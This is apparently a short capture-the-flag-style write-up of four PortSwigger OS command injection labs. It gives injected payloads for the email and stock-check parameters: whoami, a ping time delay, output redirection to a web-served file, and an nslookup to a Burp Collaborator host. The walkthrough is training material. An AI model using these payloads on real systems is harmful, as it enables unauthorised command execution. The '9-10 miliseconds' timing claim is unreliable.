## OS command injection, simple case

The command injection vulnerability is in the check stock request

![image1](/images/portswigger-oscominjection-simplecase/portswigger-oscominjection-simplecase1.png)

And this is the request

![image2](/images/portswigger-oscominjection-simplecase/portswigger-oscominjection-simplecase2.png)

At the end, add `;whoami` to get command injection

![image3](/images/portswigger-oscominjection-simplecase/portswigger-oscominjection-simplecase3.png)

<br/>

## Blind OS command injection with time delays

First intercept the request when you submit feedback

![image1](/images/portswigger-lab-blind-os-command-injection-with-time-delays/portswigger-lab-blind-os-command-injection-with-time-delays1.png)

And the request: 

![image2](/images/portswigger-lab-blind-os-command-injection-with-time-delays/portswigger-lab-blind-os-command-injection-with-time-delays2.png)

I takes 112 miliseconds

![image3](/images/portswigger-lab-blind-os-command-injection-with-time-delays/portswigger-lab-blind-os-command-injection-with-time-delays3.png)

Now change add to the `&email=` the payload `||ping+-c+10+127.0.0.1` if it takes 9-10 miliseconds it's vulnerable

![image4](/images/portswigger-lab-blind-os-command-injection-with-time-delays/portswigger-lab-blind-os-command-injection-with-time-delays4.png)

![image5](/images/portswigger-lab-blind-os-command-injection-with-time-delays/portswigger-lab-blind-os-command-injection-with-time-delays5.png)


<br/>

## Blind OS command injection with output redirection

First intercept the requests when you submit feedback

![image1](/images/portswigger-blind-os-command-injection-with-output-redirection/portswigger-blind-os-command-injection-with-output-redirection1.png)

![image2](/images/portswigger-blind-os-command-injection-with-output-redirection/portswigger-blind-os-command-injection-with-output-redirection2.png)

Now change the email parameter to `&email=||whoami>/var/images/whoami.txt||`

![image3](/images/portswigger-blind-os-command-injection-with-output-redirection/portswigger-blind-os-command-injection-with-output-redirection3.png)

Go to the home page and refresh the webpage intercepting the requests, and save the one that loads an image

![image4](/images/portswigger-blind-os-command-injection-with-output-redirection/portswigger-blind-os-command-injection-with-output-redirection4.png)

Change the filename to `?filename=whoami.txt`

![image5](/images/portswigger-blind-os-command-injection-with-output-redirection/portswigger-blind-os-command-injection-with-output-redirection5.png)


<br/>

## Blind OS command injection with out-band  interaction

Intercept the request when you submit feedback

![image1](/images/portswigger-blind-os-command-injection-with-out-of-band-interaction/blind-os-command-injection-with-out-of-band-interaction1.png)

![image2](/images/portswigger-blind-os-command-injection-with-out-of-band-interaction/blind-os-command-injection-with-out-of-band-interaction2.png)

Change the email parameter to `&email=||nslookup+burpcollaborator.net||` this will cause a DNS lookup to that domain

![image3](/images/portswigger-blind-os-command-injection-with-out-of-band-interaction/blind-os-command-injection-with-out-of-band-interaction3.png)
